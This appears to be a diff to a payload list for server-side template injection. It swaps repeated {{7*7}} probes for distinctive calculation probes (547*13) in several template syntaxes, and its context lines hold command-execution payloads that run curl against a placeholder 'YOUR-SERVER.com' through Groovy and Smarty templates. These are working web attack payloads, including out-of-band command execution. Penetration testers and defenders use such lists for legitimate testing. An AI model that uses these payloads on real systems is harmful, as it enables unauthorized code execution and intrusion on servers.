@@ -50,16 +50,13 @@ ${"curl http://YOUR-SERVER.com".execute()}
 {php}system("curl http://YOUR-SERVER.com");{/php}
 
 # ==================== CALCULATION BASED BLIND ====================
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
-{{7*7}}
+# Use a distinctive number and grep response for it (e.g. inject 547*13 and
+# watch for "7111" in any future response = template stores it):
+{{547*13}}
+${547*13}
+#set($x=547*13)${x}
+<%= 547*13 %>
+@(547*13)
 
 # ==================== ERROR BASED BLIND ====================
 {{unknown_variable}}
